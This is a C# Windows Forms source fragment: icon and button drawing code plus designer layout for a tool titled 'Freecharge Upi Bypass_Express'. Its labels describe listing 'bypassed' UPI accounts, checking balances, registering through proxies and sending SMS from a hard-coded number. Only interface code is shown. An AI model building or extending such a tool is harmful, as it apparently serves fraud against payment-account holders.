        using (Pen x = new Pen(xc, 2.2F))
        {
            x.StartCap = LineCap.Round; x.EndCap = LineCap.Round;
            g.DrawLine(x, cx - 5.5f, cy - 5.5f, cx + 5.5f, cy + 5.5f);
            g.DrawLine(x, cx + 5.5f, cy - 5.5f, cx - 5.5f, cy + 5.5f);
        }
    }

    private void FxButtonPaint(object sender, PaintEventArgs e)
    {
        Button b = sender as Button;
        if (b == null) return;
        Graphics g = e.Graphics;
        g.SmoothingMode = SmoothingMode.AntiAlias;
        g.Clear(b.Parent != null ? (b.Parent == this ? Color.White : b.Parent.BackColor) : Color.White);

        int st = FxSt(b);
        bool on = b.Enabled;
        string icon, text;
        Color accent;
        bool solid;
        if (b == button1) { icon = "play"; text = "Start"; accent = FX_ORANGE; solid = true; }
        else if (b == button2) { icon = "wallet"; text = "Check Balance"; accent = FX_BLUE; solid = true; }
        else if (b == button3) { icon = "trash"; text = "Delete"; accent = FX_RED; solid = false; }
        else if (b == btnCopy) { icon = "copy"; text = "Copy"; accent = FX_BLUE; solid = false; }
        else if (b == btnNext) { icon = "next"; text = "Next"; accent = FX_ORANGE; solid = true; }
        else { icon = ""; text = b.Text; accent = FX_BLUE; solid = true; }

        RectangleF r = new RectangleF(0.5f, st == 2 ? 1.5f : 0.5f, b.Width - 2, b.Height - 3);
        Color fg;
        if (solid)
        {
            Color top = FxMix(accent, Color.White, 0.16f), bot = FxMix(accent, Color.Black, 0.08f);
            if (st == 1) { top = FxMix(top, Color.White, 0.14f); bot = FxMix(bot, Color.White, 0.10f); }
            if (st == 2) { top = FxMix(top, Color.Black, 0.12f); bot = FxMix(bot, Color.Black, 0.16f); }
            if (!on) { top = FxMix(top, Color.White, 0.55f); bot = FxMix(bot, Color.White, 0.55f); }
            if (st != 2 && on)
                FxFill(g, new RectangleF(r.X, r.Y + 2, r.Width, r.Height), 9, Color.FromArgb(st == 1 ? 90 : 55, accent), Color.Empty);
            using (GraphicsPath path = FxRound(r, 9))
            using (LinearGradientBrush lb = new LinearGradientBrush(r, top, bot, LinearGradientMode.Vertical))
                g.FillPath(lb, path);
            fg = Color.White;
        }
        else
        {
            Color fill = st == 2 ? FxMix(accent, Color.White, 0.78f) : st == 1 ? FxMix(accent, Color.White, 0.90f) : Color.White;
            FxFill(g, r, 9, fill, st == 0 ? FxMix(accent, Color.White, 0.55f) : accent);
            fg = on ? FxMix(accent, Color.Black, 0.1f) : Color.FromArgb(148, 163, 184);
        }

        Size ts = TextRenderer.MeasureText(g, text, fxFBtn, Size.Empty, TextFormatFlags.NoPadding);
        int iw = icon.Length > 0 ? 16 + 8 : 0;
        int x = (int)(r.X + (r.Width - iw - ts.Width) / 2);
        int cy = (int)(r.Y + r.Height / 2);
        if (iw > 0) FxIcon(g, icon, new Rectangle(x, cy - 8, 16, 16), fg);
        TextRenderer.DrawText(g, text, fxFBtn, new Rectangle(x + iw, cy - ts.Height / 2 - 1, ts.Width + 4, ts.Height + 2), fg,
            TextFormatFlags.Left | TextFormatFlags.VerticalCenter | TextFormatFlags.NoPadding);
    }

    // Checkbox drawn as a slider switch with a two-line label (the CheckBox Text itself is not changed).
    private void FxTogglePaint(object sender, PaintEventArgs e)
    {
        CheckBox c = sender as CheckBox;
        if (c == null) return;
        Graphics g = e.Graphics;
        g.SmoothingMode = SmoothingMode.AntiAlias;
        g.Clear(Color.White);

        int st = FxSt(c);
        bool on = c.Checked;
        float th = 20, tw = 38, ty = (c.Height - th) / 2f;
        RectangleF track = new RectangleF(1, ty, tw, th);
        Color t = on ? FX_ORANGE : Color.FromArgb(203, 213, 225);
        if (st == 1) t = on ? FxMix(t, Color.White, 0.12f) : Color.FromArgb(186, 198, 214);
        if (st == 2) t = FxMix(t, Color.Black, 0.12f);
        if (!c.Enabled) t = FxMix(t, Color.White, 0.5f);
        if (on && st != 2) FxFill(g, RectangleF.Inflate(track, 2, 2), th / 2 + 2, Color.FromArgb(50, FX_ORANGE), Color.Empty);
        FxFill(g, track, th / 2, t, Color.Empty);
        float kd = th - 4, kx = on ? track.Right - kd - 2 : track.X + 2;
        using (SolidBrush sh = new SolidBrush(Color.FromArgb(45, 0, 0, 0))) g.FillEllipse(sh, kx, ty + 3, kd, kd);
        using (SolidBrush kb = new SolidBrush(Color.White)) g.FillEllipse(kb, kx, ty + 2, kd, kd);
        if (on)
            using (Pen tick = new Pen(FX_ORANGE, 1.6F))
            {
                tick.StartCap = LineCap.Round; tick.EndCap = LineCap.Round;
                float cx = kx + kd / 2, cy = ty + 2 + kd / 2;
                g.DrawLines(tick, new[] { new PointF(cx - 3.5f, cy), new PointF(cx - 1, cy + 3), new PointF(cx + 4, cy - 3) });
            }

        int tx = (int)tw + 12;
        TextRenderer.DrawText(g, "Use IP for registration", fxFCaption, new Rectangle(tx, 2, c.Width - tx, c.Height / 2),
            on ? Color.FromArgb(194, 65, 12) : FX_TEXT,
            TextFormatFlags.Left | TextFormatFlags.Bottom | TextFormatFlags.SingleLine | TextFormatFlags.NoPadding | TextFormatFlags.EndEllipsis);
        TextRenderer.DrawText(g, "Only for foreign VPS  -  asks IP:PORT:USER:PASS", fxFSmall,
            new Rectangle(tx, c.Height / 2 + 2, c.Width - tx, c.Height / 2 - 2), FX_MUTED,
            TextFormatFlags.Left | TextFormatFlags.Top | TextFormatFlags.SingleLine | TextFormatFlags.NoPadding | TextFormatFlags.EndEllipsis);
    }

    private void FxListDraw(object sender, DrawItemEventArgs e)
    {
        ListBox lb = sender as ListBox;
        if (lb == null) return;
        Graphics g = e.Graphics;
        using (SolidBrush w = new SolidBrush(Color.White)) g.FillRectangle(w, e.Bounds);
        if (e.Index < 0 || e.Index >= lb.Items.Count) return;
        g.SmoothingMode = SmoothingMode.AntiAlias;

        bool sel = (e.State & DrawItemState.Selected) != 0;
        bool hot = e.Index == fxHotItem;
        RectangleF row = new RectangleF(e.Bounds.X + 3, e.Bounds.Y + 2, e.Bounds.Width - 7, e.Bounds.Height - 4);
        if (sel)
        {
            FxFill(g, row, 6, Color.FromArgb(255, 237, 213), Color.Empty);
            FxFill(g, new RectangleF(row.X, row.Y + 5, 3, row.Height - 10), 1.5f, FX_ORANGE, Color.Empty);
        }
        else if (hot)
        {
            FxFill(g, row, 6, Color.FromArgb(239, 246, 255), Color.Empty);
        }

        Color ic = sel ? FX_ORANGE : FX_BLUE;
        FxIcon(g, "upi", new Rectangle(e.Bounds.X + 12, e.Bounds.Y + (e.Bounds.Height - 14) / 2, 14, 14), ic);
        string text = lb.GetItemText(lb.Items[e.Index]);
        TextRenderer.DrawText(g, text, sel ? fxFCaption : fxFBody,
            new Rectangle(e.Bounds.X + 34, e.Bounds.Y, e.Bounds.Width - 40, e.Bounds.Height),
            sel ? Color.FromArgb(154, 52, 18) : FX_TEXT,
            TextFormatFlags.Left | TextFormatFlags.VerticalCenter | TextFormatFlags.SingleLine |
            TextFormatFlags.NoPadding | TextFormatFlags.EndEllipsis);
    }

    private void FxListMove(object sender, MouseEventArgs e)
    {
        int i = listBox1.IndexFromPoint(e.Location);
        if (i == fxHotItem) return;
        int o = fxHotItem;
        fxHotItem = i;
        FxInvItem(o);
        FxInvItem(i);
    }

    private void FxInvItem(int i)
    {
        if (listBox1 == null || listBox1.IsDisposed || i < 0 || i >= listBox1.Items.Count) return;
        listBox1.Invalidate(listBox1.GetItemRectangle(i));
    }

    private static void FxIcon(Graphics g, string kind, Rectangle r, Color c)
    {
        SmoothingMode old = g.SmoothingMode;
        g.SmoothingMode = SmoothingMode.AntiAlias;
        float x = r.X, y = r.Y, w = r.Width, h = r.Height;
        using (Pen p = new Pen(c, 1.6F))
        using (SolidBrush b = new SolidBrush(c))
        {
            p.StartCap = LineCap.Round; p.EndCap = LineCap.Round; p.LineJoin = LineJoin.Round;
            switch (kind)
            {
                case "play":
                    g.FillPolygon(b, new[] { new PointF(x + w * 0.22f, y + h * 0.1f), new PointF(x + w * 0.9f, y + h / 2), new PointF(x + w * 0.22f, y + h * 0.9f) });
                    break;
                case "next":
                    g.DrawLine(p, x + w * 0.1f, y + h / 2, x + w * 0.85f, y + h / 2);
                    g.DrawLines(p, new[] { new PointF(x + w * 0.55f, y + h * 0.2f), new PointF(x + w * 0.88f, y + h / 2), new PointF(x + w * 0.55f, y + h * 0.8f) });
                    break;
                case "copy":
                    using (GraphicsPath a = FxRound(new RectangleF(x + w * 0.3f, y + h * 0.05f, w * 0.62f, h * 0.65f), 2)) g.DrawPath(p, a);
                    using (GraphicsPath a = FxRound(new RectangleF(x + w * 0.08f, y + h * 0.3f, w * 0.62f, h * 0.65f), 2)) g.DrawPath(p, a);
                    break;
                case "trash":
                    g.DrawLine(p, x + w * 0.08f, y + h * 0.22f, x + w * 0.92f, y + h * 0.22f);
                    g.DrawLine(p, x + w * 0.36f, y + h * 0.06f, x + w * 0.64f, y + h * 0.06f);
                    g.DrawPolygon(p, new[] { new PointF(x + w * 0.2f, y + h * 0.32f), new PointF(x + w * 0.8f, y + h * 0.32f), new PointF(x + w * 0.72f, y + h * 0.95f), new PointF(x + w * 0.28f, y + h * 0.95f) });
                    break;
                case "wallet":
                    using (GraphicsPath a = FxRound(new RectangleF(x + w * 0.06f, y + h * 0.22f, w * 0.88f, h * 0.66f), 2.5f)) g.DrawPath(p, a);
                    g.DrawLine(p, x + w * 0.18f, y + h * 0.22f, x + w * 0.68f, y + h * 0.06f);
                    g.FillEllipse(b, x + w * 0.66f, y + h * 0.48f, w * 0.14f, h * 0.14f);
                    break;
                case "phone":
                    using (GraphicsPath a = FxRound(new RectangleF(x + w * 0.1f, y, w * 0.8f, h), 2.5f)) g.DrawPath(p, a);
                    g.DrawLine(p, x + w * 0.4f, y + h * 0.86f, x + w * 0.6f, y + h * 0.86f);
                    break;
                case "user":
                    g.DrawEllipse(p, x + w * 0.3f, y, w * 0.4f, h * 0.42f);
                    g.DrawArc(p, x + w * 0.08f, y + h * 0.5f, w * 0.84f, h * 0.9f, 180, 180);
                    break;
                case "upi":
                    g.DrawEllipse(p, x, y, w, h);
                    using (Font f = new Font("Segoe UI", Math.Max(5f, h * 0.48f), FontStyle.Bold, GraphicsUnit.Pixel))
                        TextRenderer.DrawText(g, "@", f, new Rectangle(r.X, r.Y - 1, r.Width + 1, r.Height + 1), c,
                            TextFormatFlags.HorizontalCenter | TextFormatFlags.VerticalCenter | TextFormatFlags.NoPadding);
                    break;
                case "sms":
                    using (GraphicsPath a = FxRound(new RectangleF(x, y + h * 0.08f, w, h * 0.68f), 3)) g.DrawPath(p, a);
                    g.DrawLine(p, x + w * 0.3f, y + h * 0.76f, x + w * 0.22f, y + h);
                    g.DrawLine(p, x + w * 0.25f, y + h * 0.42f, x + w * 0.75f, y + h * 0.42f);
                    break;
                case "bolt":
                    g.FillPolygon(b, new[] { new PointF(x + w * 0.62f, y), new PointF(x, y + h * 0.58f), new PointF(x + w * 0.46f, y + h * 0.58f),
                                             new PointF(x + w * 0.36f, y + h), new PointF(x + w, y + h * 0.4f), new PointF(x + w * 0.54f, y + h * 0.4f) });
                    break;
                case "warn":
                    g.FillEllipse(b, x, y, w, h);
                    using (Pen wp = new Pen(Color.White, 2F))
                    {
                        wp.StartCap = LineCap.Round; wp.EndCap = LineCap.Round;
                        g.DrawLine(wp, x + w / 2, y + h * 0.25f, x + w / 2, y + h * 0.55f);
                    }
                    using (SolidBrush wb = new SolidBrush(Color.White))
                        g.FillEllipse(wb, x + w / 2 - 1.2f, y + h * 0.68f, 2.4f, 2.4f);
                    break;
            }
        }
        g.SmoothingMode = old;
    }

    private void InitializeComponent()
    {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Freecharge));
            this.mobilenumber = new System.Windows.Forms.TextBox();
            this.button1 = new System.Windows.Forms.Button();
            this.btnNext = new System.Windows.Forms.Button();
            this.btnCopy = new System.Windows.Forms.Button();
            this.txtSms = new System.Windows.Forms.RichTextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.listBox1 = new System.Windows.Forms.ListBox();
            this.label4 = new System.Windows.Forms.Label();
            this.button2 = new System.Windows.Forms.Button();
            this.button3 = new System.Windows.Forms.Button();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.btnClose = new Bunifu.Framework.UI.BunifuImageButton();
            this.pnlHeader = new System.Windows.Forms.Panel();
            this.bunifuImageButton1 = new Bunifu.Framework.UI.BunifuImageButton();
            this.label5 = new System.Windows.Forms.Label();
            this.pictureBox2 = new System.Windows.Forms.PictureBox();
            this.checkBox1 = new System.Windows.Forms.CheckBox();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.btnClose)).BeginInit();
            this.pnlHeader.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.bunifuImageButton1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
            this.SuspendLayout();
            // 
            // mobilenumber
            // 
            this.mobilenumber.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mobilenumber.Location = new System.Drawing.Point(11, 84);
            this.mobilenumber.Name = "mobilenumber";
            this.mobilenumber.Size = new System.Drawing.Size(212, 26);
            this.mobilenumber.TabIndex = 0;
            // 
            // button1
            // 
            this.button1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(255)))), ((int)(((byte)(192)))));
            this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.2F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button1.ForeColor = System.Drawing.Color.Black;
            this.button1.Location = new System.Drawing.Point(11, 118);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(212, 38);
            this.button1.TabIndex = 1;
            this.button1.Text = "Start";
            this.button1.UseVisualStyleBackColor = false;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // btnNext
            // 
            this.btnNext.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(255)))), ((int)(((byte)(192)))));
            this.btnNext.Font = new System.Drawing.Font("Microsoft Sans Serif", 7.2F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnNext.Location = new System.Drawing.Point(261, 203);
            this.btnNext.Name = "btnNext";
            this.btnNext.Size = new System.Drawing.Size(111, 33);
            this.btnNext.TabIndex = 1183;
            this.btnNext.Text = "Next";
            this.btnNext.UseVisualStyleBackColor = false;
            this.btnNext.Visible = false;
            this.btnNext.Click += new System.EventHandler(this.btnNext_Click);
            // 
            // btnCopy
            // 
            this.btnCopy.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(255)))), ((int)(((byte)(192)))));
            this.btnCopy.Font = new System.Drawing.Font("Microsoft Sans Serif", 7.2F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnCopy.Location = new System.Drawing.Point(261, 162);
            this.btnCopy.Name = "btnCopy";
            this.btnCopy.Size = new System.Drawing.Size(111, 35);
            this.btnCopy.TabIndex = 1184;
            this.btnCopy.Text = "Copy";
            this.btnCopy.UseVisualStyleBackColor = false;
            this.btnCopy.Visible = false;
            this.btnCopy.Click += new System.EventHandler(this.btnCopy_Click);
            // 
            // txtSms
            // 
            this.txtSms.Location = new System.Drawing.Point(12, 162);
            this.txtSms.Name = "txtSms";
            this.txtSms.Size = new System.Drawing.Size(240, 133);
            this.txtSms.TabIndex = 1182;
            this.txtSms.Text = "";
            this.txtSms.Visible = false;
            this.txtSms.TextChanged += new System.EventHandler(this.txtSms_TextChanged);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.Location = new System.Drawing.Point(12, 464);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(321, 64);
            this.label1.TabIndex = 1181;
            this.label1.Text = "Yeh Text Registered Mobile se  { 07799000980 }\r\nPer Send karen\r\nSend Success hone" +
    " ke Baad Next Button Click Karen\r\nYa Is QR Ko Scan Karke SMS Send Kare.";
            this.label1.Visible = false;
            this.label1.Click += new System.EventHandler(this.label1_Click);
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.BackColor = System.Drawing.SystemColors.ButtonHighlight;
            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2.ForeColor = System.Drawing.Color.Red;
            this.label2.Location = new System.Drawing.Point(12, 525);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(0, 18);
            this.label2.TabIndex = 1185;
            this.label2.Visible = false;
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.Location = new System.Drawing.Point(26, 59);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(133, 16);
            this.label3.TabIndex = 1187;
            this.label3.Text = "Enter Mobile Number";
            // 
            // listBox1
            // 
            this.listBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.2F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.listBox1.FormattingEnabled = true;
            this.listBox1.ItemHeight = 17;
            this.listBox1.Location = new System.Drawing.Point(395, 84);
            this.listBox1.Name = "listBox1";
            this.listBox1.Size = new System.Drawing.Size(295, 140);
            this.listBox1.TabIndex = 1188;
            this.listBox1.SelectedIndexChanged += new System.EventHandler(this.listBox1_SelectedIndexChanged);
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label4.Location = new System.Drawing.Point(396, 59);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(133, 16);
            this.label4.TabIndex = 1189;
            this.label4.Text = "List Of Bypassed UPI";
            // 
            // button2
            // 
            this.button2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(255)))), ((int)(((byte)(192)))));
            this.button2.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.2F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button2.ForeColor = System.Drawing.Color.Black;
            this.button2.Location = new System.Drawing.Point(395, 245);
            this.button2.Name = "button2";
            this.button2.Size = new System.Drawing.Size(155, 38);
            this.button2.TabIndex = 1190;
            this.button2.Text = "Check Balance";
            this.button2.UseVisualStyleBackColor = false;
            this.button2.Click += new System.EventHandler(this.button2_Click);
            // 
            // button3
            // 
            this.button3.BackColor = System.Drawing.Color.Red;
            this.button3.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.2F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button3.ForeColor = System.Drawing.Color.Black;
            this.button3.Location = new System.Drawing.Point(556, 245);
            this.button3.Name = "button3";
            this.button3.Size = new System.Drawing.Size(134, 38);
            this.button3.TabIndex = 1191;
            this.button3.Text = "Delete";
            this.button3.UseVisualStyleBackColor = false;
            this.button3.Click += new System.EventHandler(this.button3_Click);
            // 
            // pictureBox1
            // 
            this.pictureBox1.Location = new System.Drawing.Point(11, 300);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(241, 157);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox1.TabIndex = 1192;
            this.pictureBox1.TabStop = false;
            this.pictureBox1.Visible = false;
            // 
            // btnClose
            // 
            this.btnClose.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.btnClose.BackColor = System.Drawing.Color.Transparent;
            this.btnClose.Cursor = System.Windows.Forms.Cursors.Hand;
            this.btnClose.Image = ((System.Drawing.Image)(resources.GetObject("btnClose.Image")));
            this.btnClose.ImageActive = null;
            this.btnClose.Location = new System.Drawing.Point(678, 6);
            this.btnClose.Name = "btnClose";
            this.btnClose.Size = new System.Drawing.Size(26, 20);
            this.btnClose.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.btnClose.TabIndex = 1;
            this.btnClose.TabStop = false;
            this.btnClose.Zoom = 10;
            this.btnClose.Click += new System.EventHandler(this.btnClose_Click);
            // 
            // pnlHeader
            // 
            this.pnlHeader.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(192)))));
            this.pnlHeader.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.pnlHeader.Controls.Add(this.bunifuImageButton1);
            this.pnlHeader.Controls.Add(this.label5);
            this.pnlHeader.Dock = System.Windows.Forms.DockStyle.Top;
            this.pnlHeader.ForeColor = System.Drawing.Color.Black;
            this.pnlHeader.Location = new System.Drawing.Point(0, 0);
            this.pnlHeader.Name = "pnlHeader";
            this.pnlHeader.Size = new System.Drawing.Size(704, 27);
            this.pnlHeader.TabIndex = 1216;
            this.pnlHeader.Paint += new System.Windows.Forms.PaintEventHandler(this.pnlHeader_Paint);
            // 
            // bunifuImageButton1
            // 
            this.bunifuImageButton1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.bunifuImageButton1.BackColor = System.Drawing.Color.Transparent;
            this.bunifuImageButton1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.bunifuImageButton1.Image = ((System.Drawing.Image)(resources.GetObject("bunifuImageButton1.Image")));
            this.bunifuImageButton1.ImageActive = null;
            this.bunifuImageButton1.Location = new System.Drawing.Point(679, 1);
            this.bunifuImageButton1.Margin = new System.Windows.Forms.Padding(2);
            this.bunifuImageButton1.Name = "bunifuImageButton1";
            this.bunifuImageButton1.Size = new System.Drawing.Size(22, 22);
            this.bunifuImageButton1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.bunifuImageButton1.TabIndex = 1189;
            this.bunifuImageButton1.TabStop = false;
            this.bunifuImageButton1.Zoom = 10;
            this.bunifuImageButton1.Click += new System.EventHandler(this.bunifuImageButton1_Click_1);
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.2F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Underline))), System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label5.Location = new System.Drawing.Point(3, 6);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(255, 17);
            this.label5.TabIndex = 1188;
            this.label5.Text = "Freecharge Upi Bypass_Express";
            // 
            // pictureBox2
            // 
            this.pictureBox2.Location = new System.Drawing.Point(509, 361);
            this.pictureBox2.Name = "pictureBox2";
            this.pictureBox2.Size = new System.Drawing.Size(181, 139);
            this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox2.TabIndex = 1217;
            this.pictureBox2.TabStop = false;
            // 
            // checkBox1
            // 
            this.checkBox1.AutoSize = true;
            this.checkBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.2F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.checkBox1.Location = new System.Drawing.Point(15, 36);
            this.checkBox1.Name = "checkBox1";
            this.checkBox1.Size = new System.Drawing.Size(381, 21);
            this.checkBox1.TabIndex = 1222;
            this.checkBox1.Text = "Use Ip for for Registration--(only for foreign vps)";
            this.checkBox1.UseVisualStyleBackColor = true;
            this.checkBox1.CheckedChanged += new System.EventHandler(this.checkBox1_CheckedChanged);
            // 
            // Freecharge
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(192)))));
            this.ClientSize = new System.Drawing.Size(704, 512);
            this.Controls.Add(this.checkBox1);
            this.Controls.Add(this.pictureBox2);
            this.Controls.Add(this.pnlHeader);
            this.Controls.Add(this.btnClose);
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.button3);
            this.Controls.Add(this.button2);
            this.Controls.Add(this.label4);
            this.Controls.Add(this.listBox1);
            this.Controls.Add(this.label3);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.btnNext);
            this.Controls.Add(this.btnCopy);
            this.Controls.Add(this.txtSms);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.button1);
            this.Controls.Add(this.mobilenumber);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "Freecharge";
            this.SizeGripStyle = System.Windows.Forms.SizeGripStyle.Show;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Freecharge_By Express";
            this.Load += new System.EventHandler(this.Freecharge_Load);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.btnClose)).EndInit();
            this.pnlHeader.ResumeLayout(false);
            this.pnlHeader.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.bunifuImageButton1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

    }

    private void bunifuImageButton1_Click_1(object sender, EventArgs e)
    {
        base.Close();
    }
}
